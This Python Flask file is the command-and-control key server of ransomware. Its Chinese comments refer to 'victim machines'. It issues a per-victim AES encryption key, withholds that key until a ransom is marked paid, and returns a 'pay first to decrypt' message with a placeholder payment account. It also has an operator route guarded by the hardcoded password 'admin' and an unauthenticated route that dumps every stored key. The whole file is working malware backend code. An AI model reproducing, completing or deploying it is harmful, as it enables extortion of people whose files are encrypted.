# coding : utf-8

import secrets
import string
from flask import Flask, request, jsonify
from rich import print as print
import base64


app = Flask(__name__)


# uuid_list = {'uuid': [b'key', 'Payed']}
# uuid_list = {"uuid": [b'adsfadsfadsfas', True]}
uuid_list = {}


@app.route("/getKey", methods=["POST"])
def getKey():
    uuid = request.form["uuid"]

    # 密钥只应该被请求两次：第一次加密的时候，从此以后除非你付过钱，否则密钥严格保密，不准别人知道。

    # 如果已经请求过了密钥获取，那么就看是否支付过了
    if uuid in uuid_list.keys():
        if uuid_list[uuid][1]:
            return jsonify(
                {"status": "payed", "data": base64.b64encode(uuid_list[uuid][0]).decode('utf-8')}
            )
        else:
            # 没有支付过，还想要密钥，想得美
            print(uuid + " 没有支付过，还想要密钥，想得美")
            return jsonify({"status": "nopay", "data": base64.b64encode("想解密，先付钱！打款账号：1234567890".encode("utf-8")).decode('utf-8')})

    # 没有请求过，说明这是一台新的受害者机器
    # 生成一个随机aes密钥(大小写字母和数字)
    aes_key = generate_aes_key(32)
    uuid_list[uuid] = [aes_key, False]

    print(uuid + " 成功创建密钥", uuid_list[uuid])

    return jsonify(
        {"status": "create", "data": base64.b64encode(aes_key).decode("utf-8")}
    )


@app.route("/setPay", methods=["GET"])
def setPay():
    uuid = request.args["uuid"]
    value = False if request.args["value"] == "0" else True
    passwd = request.args["passwd"]

    if passwd != "admin":
        print("请求出错：", request.args, "密码错误")
        return "请求出错：" + passwd + "密码错误"

    if uuid not in uuid_list.keys():
        print(uuid + "这台主机没有记录！")
        return uuid + "这台主机没有记录！"

    uuid_list[uuid][1] = value

    print(uuid + "的支付状态已经更改为：" + str(value))

    return uuid + "的支付状态已经更改为：" + str(value)


@app.route("/getList", methods=["GET"])
def getList():
    return str(uuid_list)


def generate_aes_key(length):
    alphabet = string.ascii_letters + string.digits
    key = "".join(secrets.choice(alphabet) for i in range(length))
    return key.encode('utf-8')


if __name__ == "__main__":
    app.run('0.0.0.0')
